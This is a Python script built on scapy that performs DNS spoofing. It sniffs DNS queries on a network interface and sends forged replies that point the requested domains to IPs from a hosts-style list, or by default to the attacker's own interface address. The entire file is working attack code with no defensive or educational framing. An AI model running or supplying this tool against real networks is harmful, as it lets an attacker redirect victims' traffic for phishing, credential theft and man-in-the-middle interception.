
from scapy.all import *
from scapy.layers.dns import DNSQR

hosts_dict = {}

q_ids = set();

def poison(iface=None, hosts=None, expression=None):
	global hosts_dict
	if hosts:
		for line in hosts:
			rule = line.split(' ')
			name = rule[1].split('\n')[0]
			ip = rule[0]
			hosts_dict[name] = ip
	else:
		ip = get_if_addr(conf.iface) if not iface else get_if_addr(iface)
		hosts_dict["*"] = ip
	parse_interface(iface, expression)

def parse_interface(iface, expression):
    print("Spoofing DNS packets from interface...")
    if iface:
        sniff(filter=expression, prn=identify_pkt, iface=iface)
    else:
        sniff(filter=expression, prn=identify_pkt)

def identify_pkt(packet):
	if packet.haslayer(UDP) and packet.haslayer(DNS) and packet.haslayer(DNSQR):
		process_query(packet)
	else:
		pass

def spoof_reply(packet, spoof_ip):
	global q_ids
	q_ids.add(packet[DNS].id)
	return IP(dst=packet[IP].src, src=packet[IP].dst)/\
	UDP(dport=packet[UDP].sport,sport=packet[UDP].dport)/\
	DNS(id=packet[DNS].id, qd=packet[DNS].qd, qr=1, ancount=1,\
	an=DNSRR(rrname=packet[DNSQR].qname, ttl=300 ,rdata=spoof_ip))

def process_query(packet):
	#check if its in the hosts_dns
	global q_ids
	domain = (packet[DNSQR].qname).decode()[:-1]
	if packet[DNS].id not in q_ids: 
		if domain in hosts_dict:
			ip_addr = hosts_dict[domain]
			send(spoof_reply(packet, ip_addr), verbose=0)
			print("Spoofing %s with %s"  % (domain, ip_addr))
		elif "*" in hosts_dict:
			ip_addr = hosts_dict["*"]
			send(spoof_reply(packet, ip_addr), verbose=0)
			print("Spoofing %s with %s"  % (domain, ip_addr))




